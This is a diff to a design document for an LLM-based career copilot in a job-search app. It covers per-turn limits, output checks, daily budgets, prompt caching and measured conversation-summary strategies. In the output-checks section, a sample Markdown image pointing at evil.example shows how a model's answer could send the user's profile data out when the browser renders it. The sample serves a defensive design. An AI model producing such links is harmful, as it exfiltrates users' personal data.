@@ -70,16 +70,16 @@ All runs together cost $0.0072 for 49 calls.
 
 ## Limits: how a turn stops
 
-| Limit                 | Value                             | Enforced by                                                           |
-| --------------------- | --------------------------------- | --------------------------------------------------------------------- |
-| Tool steps per turn   | 5                                 | `#[MaxSteps(5)]`                                                      |
-| One model call        | 30 s                              | `#[Timeout(30)]`, as the advisor today                                |
-| Whole turn            | 60 s                              | the stream closes with "took too long" and the partial answer         |
-| `ScoreFit` per turn   | 3                                 | the tool refuses a fourth call and says so                            |
-| Tool output           | 20 jobs, 10 gaps, reasons ≤ 5     | the tool, before the model reads it                                   |
-| Cost per turn         | $0.005                            | step middleware sums the turn's usage and starts no step past the cap |
-| Cost per user per day | `copilot_daily_budget_usd`, $0.05 | `DailyBudget`, checked before the turn                                |
-| Turns per minute      | 10                                | `throttle:advisor`                                                    |
+| Limit                 | Value                             | Enforced by                                                         |
+| --------------------- | --------------------------------- | ------------------------------------------------------------------- |
+| Tool steps per turn   | 5                                 | `#[MaxSteps(5)]`                                                    |
+| One model call        | 30 s                              | `#[Timeout(30)]` on `CareerCopilot`                                 |
+| Whole turn            | 60 s                              | `LimitTurn` step middleware: the next step runs without tools       |
+| `ScoreFit` per turn   | 3                                 | the tool refuses a fourth call and says so                          |
+| Tool output           | 20 jobs, 10 gaps, reasons ≤ 5     | the tool, before the model reads it                                 |
+| Cost per turn         | $0.005                            | `LimitTurn`: prices the turn's usage so far; past the cap, no tools |
+| Cost per user per day | `copilot.daily_budget_usd`, $0.05 | `ai.budget:copilot`, checked before the turn, on copilot spend only |
+| Turns per minute      | 10                                | `throttle:copilot`                                                  |
 
 A turn ends when the model answers without a tool call, or when any limit is reached. At a limit, the copilot answers with what it has and names the limit. It does not retry.
 
@@ -93,7 +93,7 @@ A turn ends when the model answers without a tool call, or when any limit is rea
 
 Every answer passes these checks on the server before it is sent. The stream holds back an unfinished word, so a link is checked whole.
 
-1. **Plain text only.** The chat shows answers as text, never as Markdown or HTML (`advisor.tsx` does this today). An image is never rendered. A Markdown image such as `![](https://evil.example/?q=<profile>)` would make the browser send the data when the answer is shown, with no tool call.
+1. **Plain text only.** The chat shows answers as text, never as Markdown or HTML (`copilot.tsx` uses `whitespace-pre-wrap` text). An image is never rendered. A Markdown image such as `![](https://evil.example/?q=<profile>)` would make the browser send the data when the answer is shown, with no tool call.
 2. **Links on an allowlist.** A URL is kept only when its host is the app's own domain or a job source host ([`docs/job-sources.md`](job-sources.md)). Any other URL is replaced with "[link removed]".
 3. **No contact details.** Email addresses and phone numbers are replaced, with the same patterns as the resume redaction ([ADR 0009](adr/0009-redact-personal-data-by-label-and-format-in-any-locale.md)). The copilot never needs to show one: a posting's apply link is its allowlisted URL.
 
@@ -110,9 +110,33 @@ On the cheap tier ($0.10 per million input tokens, $0.50 per million output toke
 
 The $0.005 cap stays above the worst case, so it stops only a turn that went wrong.
 
-**Budget.** The advisor's $0.02 a day was sized for a question at about $0.00024. A copilot turn costs about 6 times as much, so $0.02 gives about 12 typical turns, less than one real session. The copilot gets its own per-user budget, $0.05 (about 30 typical turns). The global cap ([ADR 0014](adr/0014-cap-the-daily-ai-spend-of-all-users.md)) stays the protection against abuse, and it grows with expected daily users. The reserve for established accounts in ADR 0014 is still only planned. It must ship with the copilot: without it, 20 fake accounts at $0.05 spend a $1.00 global cap.
+**Budget.** The advisor's $0.02 a day was sized for a question at about $0.00024. A copilot turn costs about 6 times as much, so the copilot has its own per-user budget, $0.05, counted on copilot spend only; the other features keep $0.02 without it. A tool's own calls (`ExplainFit`, a query embedding) are recorded under their own features, so they count toward the $0.02 and not toward the turn cap. The measured 30-turn conversation below cost $0.037 with the full history, about three quarters of the day's copilot budget in one long session. The global cap ([ADR 0014](adr/0014-cap-the-daily-ai-spend-of-all-users.md)) stays the protection against abuse, and the reserve for established accounts now ships with the copilot: accounts younger than 3 days or without a parsed resume share at most 30% of the global cap.
 
 **Prompt caching.** The instructions and the tool definitions (about 1,500 tokens) are above OpenAI's 1,024-token minimum for automatic caching, and every step resends them. They go first in each request and never change within a prompt version, so the provider bills them at the cached-input rate after the first step. The usage recorder ignores cached-input discounts today ([ADR 0012](adr/0012-route-ai-tasks-to-model-tiers-and-record-every-call.md), drawback 1), so it must record the cached token count before the saving can be measured. The measured saving replaces the estimate above.
+
+## Conversation memory
+
+The copilot remembers conversations with the SDK's conversation tables ([ADR 0037](adr/0037-remember-copilot-conversations-with-a-summary-and-a-recent-window.md)). A stored assistant message keeps its steps, with the tool calls and their results, so "why is the second one a good fit?" finds the job id from the earlier search: in a real run, turn 2 called `ScoreFit(41)`, the second id of turn 1.
+
+### At turn 30
+
+<!-- TODO (you): at turn 30 the conversation is 40,000 tokens, and every reply is slow and expensive. Compare three strategies: a sliding window, summarization, and retrieval over past turns. Which fits this product? -->
+
+### Measured: summary of older turns
+
+One scripted conversation of 30 turns (searches, fit questions, and questions that recall early turns) ran three times on the cheap tier. "History at turn 30" is the input of the first step of the last turn, which is the instructions, the tool definitions and the history.
+
+| Run                                                       | Copilot input tokens | Copilot cost | Summary calls | Total cost | History at turn 30 |
+| --------------------------------------------------------- | -------------------- | ------------ | ------------- | ---------- | ------------------ |
+| Full history (SDK window of 100 messages)                 | 353,692              | $0.0369      | none          | $0.0375    | 11,581             |
+| Summary after every turn, last 10 messages (first prompt) | 177,437              | $0.0195      | 25, $0.0087   | $0.0284    | 2,499              |
+| Summary every 10 messages, last 10–20 (final prompt)      | 290,033              | $0.0309      | 5, $0.0035    | $0.0350    | 6,280              |
+
+- **What costs the tokens:** old tool results. A `SearchJobs` result stays in the history after its turn, and every later step resends it. The history grew by about 380 tokens a turn, and turns with tools resend it once per step.
+- **The first summarizer prompt** wrote the summary in Indonesian for an English conversation (it guessed the language from the profile country), and it kept the search's `match` ranks as "fit" scores. The final prompt names the language of the user's messages and keeps only `ScoreFit` scores.
+- **Recall:** with the final prompt, the answers to "which company had the highest salary?" and "which Python roles did you show me?" agreed with the full-history run. Both summary runs lost one wish: the user's "over $4,000 a month" search at turn 6.
+- **Length:** the final summary was 381 words, not 200, because it keeps every job the conversation named (23).
+- **Trade-off:** summarizing after every turn halves the copilot's input, but the summarizer's own calls take half of that saving, so the total falls 24%. Summarizing in batches of 10 messages costs 40% as much in summary calls, but the longer recent window keeps more old tool results, so the total falls only 7%. The configured default is the batched run (`copilot.summary_window` 10, `copilot.summary_batch` 10).
 
 ## One turn
 
